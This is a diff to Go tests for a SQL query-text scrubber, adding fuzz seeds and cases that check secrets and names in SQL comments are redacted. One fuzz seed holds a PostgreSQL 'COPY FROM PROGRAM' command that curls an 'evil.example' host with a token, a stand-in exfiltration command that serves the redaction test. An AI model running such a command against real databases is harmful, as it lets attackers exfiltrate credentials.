@@ -88,10 +88,23 @@ func FuzzScrubQueryText(f *testing.F) {
 		"ALTER ROLE app WITH ENCRYPTED PASSWORD 'md5abc'",
 		"COPY t FROM PROGRAM 'curl https://evil.example/?token=abcd'",
 		"DO $$ BEGIN PERFORM login('root','p@ss') END $$",
+		// Comment bodies (#54).
+		"SELECT 1 -- api_key=sk_live_abc", "SELECT 1 /* a /* b */ c */", "SELECT '--' -- don't",
 	} {
 		f.Add(s)
 	}
 	f.Fuzz(func(t *testing.T, in string) {
+		// Whatever a comment holds, only the marker survives.
+		if !strings.ContainsAny(in, "\r\n") {
+			if got := ScrubQueryText("SELECT 1 -- " + in); got != "SELECT ? -- ?" {
+				t.Errorf("line-comment body survived: %q -> %q", in, got)
+			}
+		}
+		if !strings.Contains(in, "*/") && !strings.Contains(in, "/*") {
+			if got := ScrubQueryText("SELECT 1 /* " + in + " */"); got != "SELECT ? /* ? */" {
+				t.Errorf("block-comment body survived: %q -> %q", in, got)
+			}
+		}
 		out := ScrubQueryText(in)
 		if m := reEmail.FindString(out); m != "" {
 			t.Errorf("email-shaped substring survived: %q -> %q (%q)", in, out, m)
@@ -120,6 +133,38 @@ func TestScrubQueryText_placeholdersAndUtilityLiterals(t *testing.T) {
 	util := ScrubQueryText("DO $$ BEGIN INSERT INTO people(email) VALUES('alice@example.com'); END $$")
 	if strings.Contains(util, "@example.com") || strings.Contains(util, "alice") {
 		t.Errorf("DO-block literal leaked through pgss text: %q", util)
+	}
+}
+
+// #54: comment bodies are free text no shape regex catches.
+func TestScrubQueryText_comments(t *testing.T) {
+	cases := []struct{ name, in, want string }{
+		{"line comment secret", "SELECT * FROM users WHERE id = $1 -- api_key=sk_live_abcDEFghiJKL",
+			"SELECT * FROM users WHERE id = $1 -- ?"},
+		{"block comment name", "SELECT 1 /* customer: Jane Doe */", "SELECT ? /* ? */"},
+		{"sqlcommenter tags", "SELECT 1 /* controller='users',user='jane.doe' */", "SELECT ? /* ? */"},
+		{"nested block", "SELECT 1 /* outer /* inner secret */ still comment */ FROM t", "SELECT ? /* ? */ FROM t"},
+		{"line ends at newline", "SELECT a -- token ghp_x\nFROM t", "SELECT a -- ?\nFROM t"},
+		{"unterminated block over-redacts", "SELECT a FROM t /* secret", "SELECT a FROM t /* ? */"},
+		{"-- inside a literal", "SELECT '--x' AS a, b FROM t", "SELECT '?' AS a, b FROM t"},
+		{"-- inside a quoted identifier", `SELECT "a--b" FROM t`, `SELECT "a--b" FROM t`},
+		{"apostrophe inside a comment", "SELECT a -- don't\nFROM t WHERE b = 'secret'", "SELECT a -- ?\nFROM t WHERE b = '?'"},
+		{"dollar-quoted body", "DO $$ BEGIN -- c\n END $$", "DO $REDACTED$"},
+		{"placeholder is not a dollar quote", "SELECT $1 -- tok\n, $2", "SELECT $1 -- ?\n, $2"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if got := ScrubQueryText(c.in); got != c.want {
+				t.Errorf("\n in:   %q\n got:  %q\n want: %q", c.in, got, c.want)
+			}
+		})
+	}
+}
+
+func TestScrubComments_EStringEscape(t *testing.T) {
+	in := `SELECT E'it\'s -- x', c FROM t`
+	if got := scrubComments(in); got != in {
+		t.Errorf("`--` inside an E'' string is not a comment: %q -> %q", in, got)
 	}
 }
 
